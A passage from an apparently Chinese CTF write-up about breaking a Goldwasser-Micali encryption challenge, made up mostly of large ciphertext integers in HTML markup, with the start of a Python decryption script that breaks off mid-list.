13057205711934046467118008739652612675758052758290552436105179764903448469199957925782089342100034435811618076856898039125384846873718510721165423899617, 18016141907808433145961025284467589788900284749942923516457310468709437001788966178751079198067783831673559463585356851811413814896939807067475555427374, 28185214541499079104899299096705844476508797918674889724218918359491538627046768060739267262641563085978395547302726213511677754065988144474006421669919, 8541173904106443905299905768662395072832935944800738204096451433781271007344649650999312461498262780266939438629628997360503524609987694055871540797822, 55583856938965878851727772532012615591107008734179599213849731144139750332990774963054496728870626955960023548737488241552231532876910895970717980723626, 73126878881701489711684528170287200941163894464677667890357697623803069282892472939945202511068349041064012766273020456331595582239718607715580058967921, 70354401173234203817094603858861728539350610438961386996586323986304956626309069628495646684906850309442426229300586236137286868518741887422968392162548, 8914284227759075166669843800606112854269465008336756701964119837078732698537791220276520358004294502231788167963298136537379442577658229609166991435663, 71679986255547965813146878140040664201073433340974131720089263707910307438689531571321153842267530643245284971416280923014280802420073531897677737784480, 12700447152069741878296970568845043035888752941098126195431952022535521184822464642258479573298459505834137899501751562570215414736024639835136989283837, 6343004739661668027332689782225036016497158024551360141260369562409298110062110418091776522944654709730459185916638767661342308594945318353078260927349, 63964337492108130229534104366403606549429509425838893610762333683602786560375188874744626561075352358482069214498737114463864688224040094143695973321979, 67331564851630274889744575564877053915024320348750381733860879963760029288286952415043130610380611202287853110449108590432736764101996881476127456612908, 53280882069162605530191514443798777810028687362597894103548425458220909107156582202503516464523795628658208894147158134959433009893999958404472326887421, 33987412638079761735126555460021225568819079582348419476130572631524190951142125555279430092745231216914642104268144970982726216308555881726629242470610, 13682406178752200853488921722342196537145987369704113476544421137346145516814433815172365070204243148827801660590665538792993163703633151871356444406959, 59463989125735016166555373271475329218895751331847622880739844997590477284788570075116983616019629056762256994818763091149753839468824722562416533043843, 67281682017361977913152739570150548267207777610917492408365814330418488902058223459045634717266171571439824557859718739925029610690419177548771060547694, 39405781498711220413739963695737002658793585701279503786490288662610492817823621117021234029885675098802400891723678776479565707731211683846374263316873, 53034807419358874766350432376315742395296988744022530785117462484846925513344688866349068005871824739673532913987445237461471468400241186927222857371834, 68305629722812234698423066134000790386970292527553321835797323301872488612831063496859128755927745930236100965836720379665554220277417403641562506589739, 15838477469714165090920618367681569358742354857430493842822269635842365646470133405526909343100727954425645887159301780057362634821410546797188280600973, 24406667934205773393486573213298175430629511700972743156092216312470305819697796258655710647669449052724920514990995515510027140733652668755162210879284, 68460243344752374579091832429666515661775987782765587913153602252111004705931127037248902092418367233502792799588802584226718845415421737479907804077611, 63808325950210035810812291635020630613732453561277058010602422073363230632345954950950233595453773160105621255639806986604615621453822332892789828462090, 35920729037346907063152399926080706264554331849560440381191227037937910244659464632447084476697840313861056020706495596126485303699013742182912707172975, 70315041903670157336851359766913844259670523706324294379204277248685999742047453561977925733597786796424146533733873673211660303409007875211743693703450, 39300531126860319955398345847761010603834225325535364925973189673883589019704883130648163179767141337507300067661030698253528221916592525918624340607537, 15496845894895615630021254140566466646250515307806313944390059489493636414202320808813409873352911875321240477276777125460299625425443517127346136060402, 6918931991334214049432302933214038877664252698312543806498810568265540530745938020106356587006559879317556154131091801485516823150639771462068552490458, 13284319826136226129231185037901985819553434334436034136363422696599972727231112997735289148332196516271619405264890626985179077260440615779761000533675, 47141354451986229521055621338816842478003758611988390046169176610982917702117914199406800715608779829266151978859414114993007913651989935003014956276172, 62006071231519162075067533854248673825540723340885150250907087023728863043449786611822047715700318722376817127112362733271740625676783440798426908449101, 63893521915695074076473015870298955838191664815517808757499000857893428891197252747360448837407785054229725838898014349928665255821170162098307539344307, 53724997828497244329408633732485843721280646497077186636538276560039817034467049143979659252524650609122526779152238242200009648428459318191364710668758, 59560026843867449601276263740933112576182129239752897447857785482266968806850863675639974741623809306675891510190099978299125663568621065833548636364530, 40908904103345585788262408080445592912077785202466130402193215696781356453887694866479723318713262095397682184771025397015406424244516593134998423540293, 21520846393831470685610096190168502256530920634386412660925756889910811879936477244071180593183278964080595838026896057947192168361175044065775753001472, 71994121934100897695373777005150806654834175335935905432800180220212844161938577456202364343367762384804519329089155317640274999082541777992495590496300, 59953753983754938792876611451670073996692753691715543251991783347838397186003557839758271745884505324101699352687982352675858568077550526416572161213218, 32018619708338154045357870379406367509414130390075786097563998491238705394761106321287493739342215745501191759206980684126857845949108887540197973688400, 19753200456167466465779432336842541030557413397596794468519345155114986012441764419115444925556673818310817249150486960437725537702448521078373504867565, 7342484858213250235462608889213386080064726860046853081716849206494415366815619844020076108010255128616757216474086252862052951751272920557333252010431, 4769896687715967889336481310203290840512712756999532930891000782787932528428270382724343267441239836234899104850512445829826485709802266593256527297538, 74355004258607576571833753840053548463378928267424658977196161874473156579212738683557688699040100682847094105589799689843205305201454653584801640872249, 6690892016551814532110082014788257179806167058472941857479165541743120455147037200870473223869330191373716321809815790713607069279076031653761661498152, 20929231349749029774507043474913656384295114733554322493333103320239789344142773690393384176681858129568549611334486303260091934120991115068065757099304, 17153283710807583417797086518064762512344132499163280505223698478090291002458606163847203257279411593037898263419480619904785414327965511942845045917778, 22050651142736213565244963818664170172032916896662073301155387192243089695489247087391670138735276225579775431936391388626697441900275744645141428022189, 50937819965132153811444565518964927860475724053299129557722050639198908074429589460667005191838429306196635373570825296681353003427220426130286971585939, 58913284462604187700172393158100310168635473835280983484905632522707627578956876728290392755044023467406825316230706821238436272638921714237556770859104, 17681890152946896225972804441881107507903984131878871289374213139906663030958773969339053682624067346901991714169068086996858271362082589139087115054292, 3909112468307243293324758000901176555871642123266849529594698077998545905775916220352604577315589652297068228906040474063596051918710761329690286227933, 26659357996912432362440742895222637274276390173496378252980802667664532931418023547469963558051869368670035728144595039473629042831713113176157537965085, 17179226767528485522234897181377818519983080414340110997618943993801738768695017677485273725010927951188829959293549597122347814093251802798150160484484, 19844433737083054737496998287597016986512276379827687999223100265664593048556212270024309974344283154237055912105437530884588065558856906602096195808242, 47348710551114046556019331306794334756808275356761888394461758029243482669094351826152778467123320068123601738366945029608823621120671776870709906375117, 9700117555541147957162539236799929299304670997996359585230076707723964209982089821563932293396563832179879999190357045199347391324979469059773776588627, 13467002873626636888949523271031927213159346608965094817646302401288661282610791478079736771259321566155237819209065435898148651759189622569101507485715, 63037961235817497070200076262785758477371602688561664152916441494722106004437031909053699035623597319059285567182742183641167584128065475289227729777632, 64218176089111895416869027246603819970664313506455920488148791215602497569336950361142384744880154632841827794749450034276833675991153288511197242689683, 47942263513439392830167504616104953960109996199015457630131745546068423701013642403323839156160826426619128873229034532556824671458723559069019818844664, 68742746222182563249219749720388662956433689017106697510006439927726538907944533506432387677351240369908865156490610628224604208935896518456792275951386, 52212644024277302202964993748543423030284246877586585223549426038195599560460361521694871178577347471545868137719848759593471592105056983977953734420504, 70264906652847626089535377366020042773837334827875270446429461263902560176829906570391678559378185295380703037786129287917380381287801134465465850277689, 70338735306991917918870792762895693400859231411804513011341248280823069527131025167916532212139891844804984508688078627963308722454289725189496741592783, 11202943024812091871968653090774694646166527588230230055019610642288376456094708642854597051283662781541220199344624011347563372208585467149576852176942, 45465287772079811194403031363838060966264660784435391586286323915162071710978408348641606715517047525841527692603591534466833484617776719296902254451809, 15169623996435078849216247400427343363968733516560810866651811037320678250903315110528158438221622688297331087485255287010416118126711779737721856328337, 28852475740061878372356478463808810042887244041514447822647154314012875742232208435189321135142249111535515768003337785061252044994754401654492928310569, 5964830405726355845868918682783030011195532635722675073707557787272120274893377363927170466481373691893436275201727030031846950955144759398184269785791, 34240000270864477532075102450968450839470355528222720094068701617005525747220229570079432765968261626445996576859553932062082807188947122110205121541573, 36066847009381278750262267643160682991490266290788266279454640758898653971700345576937422987472907571638424055138191448503121311206068403152358903727931, 11170091007234975852711136174576640764201643584673042209824904622333149479149743689621256091273212460852711241325787976935346940110932656520985022456280, 58258126945548764950797717782798700624779811959209396814323548509396126011391646953885580742437208484260400477925904686859314497837461751795642440123737, 19967926920673152856540078688569687894710262985783180877581399859282901459026334508029201347173518578230966148855216358303416030336039471203130056025847, 23595548276608645278366664833783341231551328905679099443768564892841143279319379101358803895431983463285466294746298308657854039318187145804362431897564, 2893474370961335486456525824174663168081310809497129676211358076233834398745859402822323873444488074719052580697214253881106450534065425461738291869558, 5958907829034425034060316070647535655459615550109982419322554756251664155034664518669276533235954875314578002477545778915463022354241496629192604779196, 27788566883685737903481747231933802166299928088919432671260904020088637407292302594730412087020004041723078159004193447947542516090218561430792231480922, 20532093112179185521013377866112742417812622082022290708449532178388359732865119787523382224112648787182208662206608003197496180647105678758158192400715, 53650577218203110600410729325998398766865814136267255360061172788801435890073996725463408842308335996720339673250282900111659334006005865543492882410994, 27945606735686322555814229684881151888663150442470178076013292048060839982203053567640973752973606459118462199368045579874974993094749585683152306114353, 7830111257927859573531774147894277110055421603464794311873488150838576658890506727221887391800809154699966290549716428882127868574637820957455771454946, 25025808677568131096842775102792540807686366181393166426022508716670220871341079639434019763537052343485081027257058743353860070591961282205809544500182, 5727554508299281734853143508379520041502848342636591640239397030993361937011007794354012913783223878938187192585041630893973877566528148234547516190549, 34125297955221973416857421179727086657998910466291260285578023763300602193457505573438526997539188005416829176125101756371491215872928342534317152560632, 32748794215539175827451064809169640707872656691637312790248785369034804895807371648792467471366168858175551862032815723885968389112394766296982682443669, 19316062337601046084359756740917069089224659580679757830844402882574641776835008814717493659219551992308545704093654161563862554123430967564362043544475, 16698150154757920977809280429499684949586664950572392192530208431996083807110717281687762672769576510155761079366746466550237192996169124113339334886230, 44572056955848609010373092439149356067260311771322096152721745227413956103682879244155534554941522431647827072846297085468860260003046353502705163208246, 27628575438344418993708339803452443890754069104828236665940305554239599902121186251891130374253429078333471004275298197440209461188118994332259999120164, 61919652562044972586438492785212427980643594673222454260723387039610192124396273187701658792233976764341751602543127060384407044689376048608848519817966, 46109764189688329101004508471171450628496264955374314980452086114935940284534425097345137553792317990951285615961627798248025371385228530104733124807466, 46817387909791035117400619877531601085593430973492709899023738884533565717056702943707383750398878694854456668238661907490893742791290178958747041681661, 59056224920609792204565568830061390745355488565348333616939229708289518825178885105132973296275188941665728400536826108349556934037483523802869792969716, 66604984921500741665478926723143420146438008068509389500728173853359052714091540238730324836724525809382581628360434354102848448924156047215001921555337, 31419582430779462840265313481263250807512794931203141071416250525469576085849479844947749880276719895647109269316672096266294357898786379072006529876864, 39183832730973061755201647330753616948134226115790320443363338294219451770753694348259167324654888119971382851094286357667963928230844906403886283289603, 3283255784320516413168899839829830028094602407822730101434806505467144706365783146560674309642101764920423301535255518747699612103072011492758793346946, 33368835974991525266725023131287562136839356113213003074639977323208007298803414289567135487257122997245456354564103035169531096968774429702946303497005, 69846025000402574364962470590372113840860535424086059210489025038699977139863035493677207474408680292062773766558077221180073317914557709977751070278701, 34224232632002355134365134629936005598177140616238858498314305970780852215452788902032135977405618831573456053924472889839514221495216331158722016210045, 65658980938469147193290995330802413952882415964793941700703938082218727023573782508973634540422819521500781964327919480012170455893980979452781727496450, 9665250348154536654206530131694515665172789483002642996612304591358982054881243090223340150894464762416439064809966191601896552757074713738589101038945, 8284215764601217981544785999422488229859061814390197195042613376491836774363916339272149964393696441572819237956327108891284365148450554717902579008885, 53839210761275384122812678155375624236213180995083637849090835596108532323779151952329262056317064448003166882964978836017773003455831766519615849734309, 8879066950085937295713426375145168962599389613745881844691288681084047755219605949515654929255916456463715160675759365433899307173061948451396093081300, 44846522954890932053452170548384737961090700275209642378685662035957105157761437451596217747093401844478988631729230318383327981353712362273424303455125, 43158163002980268176859470096906775042752252325756903267533186654149503438997066932081638361997913554233587761452222246607235427619695339583560854453989, 52573321691121279494123052995574692408510998007843795734096932344446198410817800561173257074232286807684589742033894643046244979672762218377487299434722, 7897550374384904887513967113216775000773764113952765407625043995683474308691357357102548770113514399030757334911738320038416173083084558400152128218597, 16715592176910978920444709654700402674087729403854503083620096481591569067609291105780994401753704255670785725498133269560763193450380953726654434098377, 13997295715451071253747239124428639199617619156231247326729836233417198543504118262938847989649348778500848314555687607052915438695191930013893628900615, 47229599794488613098124056349473823155280392998354765758670868622165063315177232324540165316843226647506443608478789352548001630604076040168618807914792, 35258213694320046701654200010884312588312321572105544777004280046591344354420706119915893205430664500593588418655204102873984500148524518893396701626955]</span><br></pre></td></tr></table></figure>

<p>ctftime上有原题，但是略有不同，更简单了；它提供了私钥可以分解n</p>
<p><a href="https://ctftime.org/writeup/16120">https://ctftime.org/writeup/16120</a></p>
<p>顺着知道这是Goldwasser-Micali加密系统，也就是同态加密；然后在la佬的博客上找到了脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">N = <span class="number">76412591878589062218268295214588155113848214591159651706606899098148826991765244918845852654692521227796262805383954625826786269714537214851151966113019</span></span><br><span class="line"></span><br><span class="line">ct = [<span class="number">3266754124418328672247866726679755848701520371443746634280907120024788951726790644565764235065010905480462052367779604906344974859812257431783971523801</span>, <span class="number">3910983850369346009480778834354740700744997092428714236904249742230620033736627429141128095231382899913639523058150705425021618891808444602545149939881</span>, <span class="number">27317810920765841342086929111042193579497353621610031484780035299001131982878467015665982909548553024787488715133220729973409548284520639203793990800234</span>, <span class="number">19049253826935282403928205549454387993361811589455900176398242634533643728656774386121481735599403129610194786842490901299693831767348811888295572944767</span>, <span class="number">46808271552976597930710682808639501725087745986478512439110229094106054260700609611651592136108105668095803793135384187386798141424456627246934054212204</span>, <span class="number">64663556663887876448521825389171681970226171803335047116994602631060184771208916838907061325157227065717836207677682181791737509930934478006410977305334</span>, <span class="number">71370989878902473729538075992611793835381097916199691855392840013136471258314666533631139620910819776545627240136734304044689167904095661008959427867080</span>, <span class="number">5120760109829368119622569216249179916662286493867330392301836160719483165296740657195693270825905530901001014831402378828989266553129276910799248011107</span>, <span class="number">25246762200155764725674915117428266946351252223920353292846537142043123004108726846560540427413694348662172063837532573805768559923596757914542578491702</span>, <span class="number">49840420035538562259818077270014233135437467586063205683943769627434293016547018393482060398482431118280370380641405128927430840198536985630649859298809</span>, <span class="number">84232356416028819831566679779591187299787046636995543449314912076840614265866721410586346948877186101748353344277333107087862936903079928428665929615</span>, <span class="number">56255989340747188472994001728565823905145449088080608312012473951209435572526372645545998691635581191431650844541918635345655144222239028951168850704422</span>, <span class="number">45785662740328453859890278502445450606890445328720454060032120470673511251330845850132591950890320517787732079986810994883608872640852386167756195212718</span>, <span class="number">54029870403864304285925769805259101311108719589466350768320792251083544066361265116520351278475192456130712826836166473186592532002794991923508524064620</span>, <span class="number">46624268375793936417415940726172495902868488296085533559474078710715899350421256180929703375516133001459740255662121433900562906914369420876721969039630</span>, <span class="number">15921219479965848802750013085928522470790034679969324752503581385316275799836521901155562358852385602763599760409651828923729107636248359311532535412386</span>, <span class="number">20190562475428250717792767608071965792428019405686414394515731600072635056217537304104019807474440130549050089029499956554142652193502911411782760901078</span>, <span class="number">41983059548033663270367946174234103357083211319135434721003248220792550449588248783877660929189053228157142988622736136441291989249080446689516065393435</span>, <span class="number">71609539411413240194556215042709157212260128588149087141493760115962392075268935955309314240733799741213805554924840687486128939284886391947755983910372</span>, <span class="number">48382284720865851648431016945797183660266155498343626372038256476287293528764330285514661435350058162782747986164808116116765643203666318480114386099343</span>, <span class="number">46730320638656612110889821918114226564809934661179594844549753878327086621670111917286750423548271235812428733761683357631975738361840732519608444014971</span>, <span class="number">55158112951581407023186496177304925445962183673199215662079568367093310059249411803313113095482726739394326470492736668839734286312650343715767983610363</span>, <span class="number">37112980203698874196497763225414417374526380133937967213841831269520374856619110460606542911440228172533968362786931746291414834514997777285267403140559</span>, <span class="number">63322083017732869600484256664107952565424442164218942893502809096945827312745918616246499734990787742358551946831008809185624657787375819807019566756170</span>, <span class="number">7131499419559104886376982790578102463139236264237964490683901837397932220525370218090186039561412497537162063460706345433646970829567561962759102801409</span>, <span class="number">58987942295441295007027662413419316243220623197071846210550338622495407069803847200822547917184493216087823262589570286179930999452321610193662415873715</span>, <span class="number">40463068017819882296397975257296430843199918804116579332129293544451758450871632123477648266871632208235745045407313414566869271527363707673269415792748</span>, <span class="number">63039255605860594706235701802182469722575918347437216391785141811844940190196047005143996180367679119101277408375635148536688180427946019402484987272510</span>, <span class="number">71847518795481381405870318786706930914683598350750876400219210332724219278096576686583523369096072741462359686018334607665415715621892012499046687826381</span>, <span class="number">26337284123753874828319186304791211620930566566120195495665155862853854859543475630545175774334287940418892288697324254994533678098095744373749417045163</span>, <span class="number">21764014175912521244824061176843027159941043924315159175826402721445924610127916171029483226782579782895796672888523861781938366363972830257845406910975</span>, <span class="number">3435623095726196844062581172306260159832381716480005885061523285318057788012070798019652466654719345533109449262217283547667486720590207050726788521007</span>, <span class="number">45919770921828919777762020824998206274312663582623531457423945627938988437572523960733207639926323480092557203738058449123337560810938710160906364447620</span>, <span class="number">10316176533060759533513950331093265748621797961634020464599935470363429799039909475463319253036787910300618231860969786155510737831206632050394210070451</span>, <span class="number">59917326034119369331371808884574791893663783551610720886605582940613080599142224466706727532690507606452696459627055492221262118596727675146540248450673</span>, <span class="number">10842419169283306075038519352806019318831568946592817182841197553628341894023325198625377701960932683672886924641591814480224960323114162850149838499007</span>, <span class="number">66742064034192815235690238007451310177229882619802417230057418182591053854863990729434269230203542276063435489487230228617313299686445072114861937495520</span>, <span class="number">17337799506489098810311640536792733150718613880893950634528762031894931254405830986337609675999763577152750890798518494436701133617817677416137197595268</span>, <span class="number">11805355039774973413960279981353089487026545524788641978782960297317350024970913592970423213016483957303390870999692309756230863161264738948268751555880</span>, <span class="number">59489883634739735974968870045855217812381229180244297407474712914329781106395937678986012546789197922278383445284656100208400201934959073937202913889830</span>, <span class="number">11401451000912707217036107785027425488005850574045702577420854119932133317734234141433888477046072783546143158822115361906593423801947424855735138806051</span>, <span class="number">18179963830269752328347012892189518105760526272986096873166870569368065912159690171168153334762363786860481716195666269739056960619187285110236225225886</span>, <span class="number">62509640700826594197993512978970850974297618960597709071687370554258739737985841220615247665877415157805625480566585584212254522216095818226299866458643</span>, <span class="number">5990222180228599266357925284831684381480268959200508566159335502046629155561009569578204543747284027605121962752167560001557422741943001415508677363231</span>, <span class="number">33433077637882273687249451259081443266379398604904264246156118486060075935455701873884654140790578203732502170849912443469942139967789200144428417241869</span>, <span class="number">67390195969105286284597473259273322568348281288068806381991832178917414558751508417404533918515282632113916633995251246834970162639704436292989924347318</span>, <span class="number">51701910800009973400544456943096381774979876707129028438769990843089912852448841473885556005345531439548870638966325407697691571465101340746897457585835</span>, <span class="number">64048417355580136172437626164825086735195128281991270452716237192859126404734412422587916788587067007095933362505117338589065656344579539799999449469574</span>, <span class="number">11024312233820256409788185405651410973909901139662527410532287633062222198961951836395718214894529860296406012036221609952405828243329490439564855935053</span>, <span class="number">45329081591634176909575079913822799290480598748734762443445536547105615371937523789002728790051543635047627596020113965500849934460327043133518899375170</span>, <span class="number">50858826475819728877134521770119997192668235111631842299351867815878082946160808043722869955055965555491424602575020061945411539811210145167251037970092</span>, <span class="number">35605374328853657972896594891951135620842006755668179374120075488686032129628717565054614577034983995013621326992214854694654154462512740843488210469396</span>, <span class="number">31170348521031754418118681749590239915934031936796619456246634052178959509402331720360681877547395350885325824851456359846571423553040992405912065457755</span>, <span class="number">59235278298913032815919203840415209842948518118915680147287275616028831011314878653857791522574491917033065613888064574586219759420566309846454002915944</span>, <span class="number">55319991676617828235828390538945693681702722602937980374183338775928431972606168528372504847459436496193456215997930129475890947660295696626996070685399</span>, <span class="number">7946870457459059970109585629186928476241935128637094143300110711234966048431895814853588251934003626794436938278721281017542468015907670659174126094588</span>, <span class="number">60110891503272403664065394170003816011867116599893134107795360372565178776851374128429405006507718785684697472100752699732488483946804818800187786578649</span>, <span class="number">28279251639525643355877411167790163315397766491944901475131371705035937611147913823680263340304888492788066877865697182783730607520500342177273147964465</span>, <span class="number">6673833370069672035529220709936517797053812916528936873626422295997956892073437608466673345610466591708954318522770521974566575022354974853539867139350</span>, <span class="number">5879041803124517031806630247719802188447725120442888110855907546956543471854281435506980968790820321124201724811614798792144878116655764899307623320136</span>, <span class="number">46864340634794085287213925222361157745729562024150128352765398567593088408221097741325336534579587914360401522890993826689469607826752680659459769771431</span>, <span class="number">8194451314034121623645292874953043868906899758451558731238739345182971126911643030327002247089719765234796367899874722374131450517330794969184864265713</span>, <span class="number">54446936497825800023536609025402128927467216919569806105966992425350211112265310321871365273194069612198965714146835792444278709366308142096412297265032</span>, <span class="number">49664620584746459632512586261608724278384529510561086522888627087059419641518391472859742516411690833878920555447289023607513439888401052315872395574373</span>, <span class="number">34156898638495828862328276933343254635452063265485210177467337609797392315838078769011438130125084767966982454733534259502040326632050149471710348508666</span>, <span class="number">30492198670321094942861049272814891796315708599800847931912081071102611152253093617978259071301664216033027428630697510455458584066407898917345416941984</span>, <span class="number">3613793784149192211009755488607428877163935560348733114269389687951497165685491322762261041825459125734297171440959408110806113464512878353595621354124</span>, <span class="number">12279705763694970673180436576088750272877526458037348371251591370848320075305832402846262804422841673867165174198233855848053055868119847638872372525395</span>, <span class="number">40877345239599080056832127332813108739794170402420519232059882581963379407650348756595927322565602511487901201482080745481960512748979230428566291962209</span>, <span class="number">50546970004760152402741173485014399024368459266914425153586817660910717388484363246842197469386308850948569760187130921902062389896918698251273033571856</span>, <span class="number">64662267274327121405145824520139519983970096850456319521102019795323464547250680114959766238015838060324781632896477707391370458399641977648129612809038</span>, <span class="number">74823756640316025618954831379580570287967795410041950245729147391511040327761948655357633338389729152644316098558070852276949927895715141311841068142683</span>, <span class="number">762075440208372468457962518481032774485090765040784352734612009016363153625431711847941729511572440976615875367460547015734181996995485157260725662952</span>, <span class="number">64718051366850823837872791256009130717247018020738367732669264535095514823570679009829052437291714822262216686090867379415239832447699096227625953654575</span>, <span class="number">14328318579478329070293281000390592890070295919392789967087225586048036901970102398921920034252680786983029475504846324077453670966766712985708086115150</span>, <span class="number">47819508550033678412702853706889631101410669749660665471143943281512698676783617665357189652026699097954120882414001154717918997258089353475775017452185</span>, <span class="number">5917167011870468624934459756466041916210766501691207791054221150438479042997857395302149649641551035080177809428783031566380296513853795548449641628586</span>, <span class="number">41372363122583466455014083650227416026095961915774665002591710993359438876577512822289349596872352743367616920266534220322805021770081399906934762996032</span>, <span class="number">28647102763694202026999877209365618843600517790276376715320831598625371231696971200891830639779198173374611170197106904989505701448484935534416324731169</span>, <span class="number">53461351058252039600406409020962287941814731855470754786484336480708351831993692806078731253573365307629429835558250376047395072489343618190215178696516</span>, <span class="number">43211630519982808255325055496431416562222405741391065144006747207494590517094963089326646224294212750016402493438856500908215224317253710640894768430281</span>, <span class="number">8489708911460505185941816612455271338936811013379084567101550260456573945478649038478506124294118197300669469552705017177655827270944844418578645699152</span>, <span class="number">22739718474207416860681516907108136245175908110579776599221423813780736521274509818317809641049136756126199753989311235943226623196775082849059257738072</span>, <span class="number">41216499670212294334651280812035668747548709105131700794545752519540336375321441907637985149672677540242864272713496740582094257029359109571709000713825</span>, <span class="number">48436506165397582669698530270507359120085582624990229731099970062649834008095239898512290025067179859801307370381405935208194802989995664780696159389689</span>, <span class="number">1585369946799131155304166792386457012394172770118639384910000681642835771323532468563585207012194611439135457247277948695062359471337941009175179750235</span>, <span class="number">8603288144119666511944003354168237303458523480925560370062388564635953061635422717389647940009966345557089758149833309897265764908036946377403726618906</span>, <span class="number">64101222620087611592309324709486851372656586138648891623135538258769906088025167941884507437869898345591373545551263183771852460865686465909022927922823</span>, <span class="number">16527144583489800339074589267622703740391892670414596775572362839811603852353263595287933280097926247287643050855717192439454800012237185587025342258030</span>, <span class="number">43667276680817082856834267636292121806981833777605458119209912299727781374012735950942847681976014650650405115417073655652257330450319405915928655376177</span>, <span class="number">39140951449701344166515688244374428886790877436502233180291072955127927101012734150869177569984136037272345222078216497684424410082172979920851697773975</span>, <span class="number">15537931042700254522587611176252004453412359577558220416074867095513378168984740154709389168969110367119587635943911825884344749910502795904913565227171</span>, <span class="number">57584115592473254303228454322525041631785171154103151093178874729079883455704358742586133432524956311883692239859557427834314150568077783639133527406561</span>, <span class="number">15902237980034809502971143965910358380816080400139184729125764474998259483264801894369466939263995676073257771273315544988512081225248999046822890564977</span>, <span class="number">50859432507876871258927044776148363731406483617554361871324332579365392377864999224029880363976243413656509052039814721618557677796897407829481142501716</span>, <span class="number">50060798173579642460106276365259395020688179551858830324826993612669623395929348865201104783185027263959131007321716038538876728815916511632533475508787</span>, <span class="number">21093401456079234258633171367778610446554117298173713744762450971193474816596635169881513417411413038931760122717931556008404922107697781138738323563002</span>, <span class="number">50871264470134644149642093828613407668761384164010018255643103521706312798607261474006789318936113229951254769246573651604524869541390940231104684687828</span>, <span class="number">65838555702814180296502565256444943340789146155658490130335701086297475619402177576374380169326664726736494368635345919297077269982160643735772030139293</span>, <span class="number">24183722911773924891963995001641331599594300538730494876239125258440555112551130346374041352293686484865295711516004079542559716598370506355252388731350</span>, <span class="number">70606983798229863770250838918961585630206515326394820998515905465501611723197873446221977733861919908305182573091789028866133518127760978086624785572904</span>, <span class="number">11574928020551879788627561129470863705564562907388661456838163800143145198992173457723644287037869966419076396134774957477432556478226898353190935778723</span>, <span class="number">61029601692381479053663587491935218989230811632558264300601308877354851284048932424730379285115898154959889378242675070408077916548569590745161494020674</span>, <span class="number">34604770125285800302365085079448294275594244440799617063053747652130859109690225689984871840665734961588683955127558201536801499336385265078556174141724</span>, <span class="number">11825597588617747085813837160017740648061802450778741359221519197975620769557373411105506691743139890711450252799721855339832409870791189985511619821148</span>, <span class="number">34221142804688884612787234476210488966584817478740599608446861479556501184308249517667796316433825013495886774426619501938042883318353949169073622932744</span>, <span class="number">18626654830829475933724422229531521260247749630282640788454897823986815196267646960322528599768563257608682140163517447300417938175281593596472310333259</span>, <span class="number">15709074995155666536793599438372653599673735072188045774362669512451580013591611414407383605083544686738323270765329148547175040050934619370240766488333</span>, <span class="number">1807120755932854104162772993352975977760368638030857510642192355770896237772277641435107116319434482498433810059226241520094868716474796133993906931214</span>, <span class="number">37175875591621937319620824075660098532446211618393274891254086565846020184454461310691428746518208846269028512685632952791283499316042277840066268195129</span>, <span class="number">14652938444415650146108426727368774911315569390356725236669074038662370902353854430602299285995671388121797270924184989138832895927715432624521826601309</span>, <span class="number">47503054411496613094174186159972883477343149161393992519368436992417560814175528597285395254700710111273038321292730265852161368920471476449693712252218</span>, <span class="number">34793266164410375187844704085373206595298873402664366666028335804777378715412285901615379046498740410095606705388808078973507358398160040266718217946420</span>, <span class="number">235777724023845578015968861685977896665545490030219293563237196041336651532625951991560690649655213041706956579810596768294392894560876103128919580119</span>, <span class="number">71699058026409903383591705758367140642656320715564592776562414985231704111130111268636522681868943716260492033121836183918600499109157978582867307435478</span>, <span class="number">5937340281741409173867715448617422850056083505252299835611627207868477902961686067795913449403704616805095770356914061148217655631521545003566311163286</span>, <span class="number">64970050684346645753410765937802248505636168494626578887182023273794960033653433460563394458144307982586048416865603229619651223215132716189029755965020</span>, <span class="number">28870151994623151917023631120163925496751172862446820796983669340074436826020543852010174031614232391623084724927387919132365749617232754179670252501288</span>, <span class="number">69316076200432522853422621078078479151899079890475362712069060151657101527879255706785128065088204453815353722430442067537036693490873329815183509775</span>, <span class="number">3656051605191401898523989951955450249753486544663894178988712577274662300636794652573077192350683038887211374712971200623563954853720538374525587861947</span>, <span class="number">59586376996345945899321257213258255736309213120802065827823301801096000077211540336197804819829222638564990740367120689915041923060818536969845303336048</span>, <span class="number">15209485646348568900613966175730263254996829574333766936919924747188067731995601898247851968054973155712860201835166302413341122127777858826564815332009</span>, <span class="number">65755944655354291863629481839344898125814080585489634477140449461486313994489712061017959934634948723074739252828514224659794230711270273986941151181246</span>, <span class="number">50044404782587975442358611321418585899140310908021360331315863141057616552340669011243801143395299815080254884794259990877619054315600014568718678262588</span>, <span class="number">18558186313286434827342393130857688381981240522540569652973740316924906520700554828290216461503534361328921396613229114436061029645283726932096210928365</span>, <span class="number">68121379646664377662543670223776546293099986219464564654888075357435343435295885243745380118444351548491552692045476944398276755320279785851733710778053</span>, <span class="number">69676172471015297584764278648519463973205605601973973954462659583351488700599697084095357354579852852975382605861180382202167440159214607938057506594888</span>, <span class="number">39868944884482077091789165603089328814636077812394209556130445270433071989411476864469152420597572325645830729366730705237597203343357461240500600362535</span>, <span class="number">23984225124526499163679989394300108542505969311640364168939273256169801709960904670771326948340213899233512604169808182913494660805720194941581797486789</span>, <span class="number">35140762457338703522439666809223184036794921565129617900381351263704514634805278362132497435138148263120289598367498165241519353320876411527172006380453</span>, <span class="number">24710691291453760841127687544504422972359827070499809049833293022746980471322200519845199709962567026745924106667690801956717451739332740526036551644785</span>, <span class="number">42582526200077717150143034364406179825370961007062721122124035466123261273825712581697916024437162094418224246572238536860392260236391392047271653531524</span>, <span class="number">67857483194339954482708519285879971058057170331448036301958621715916752108065210839856796360751666320642447394109637904785042539162094111072802047335497</span>, <span class="number">2599658436887948510146428121143122270311474436315255066097573906424588555325614896291500818473644752988078154748378704726917749596783076943413881775398</span>, <span class="number">62417511462783839398179767060659880783567096687315782396857233019238764137474740645399882358829642616473826449427654813700282313879746864145085481696994</span>, <span class="number">25046815174632206886915532324638612752235046746052396556181373371408959007980374964947016992667728355879280189035456444140202956919168084330921175866799</span>, <span class="number">26746087245003271019093242066186960118445359886088854449367123073505725700064370270771541201830383789978922299669035082389492227282511856195439127986603</span>, <span class="number">12899941330821578969367955126377518942374396461212099980148272913670808413456822700739908200534046934604705454192034690229329311450091796802978183417118</span>, <span 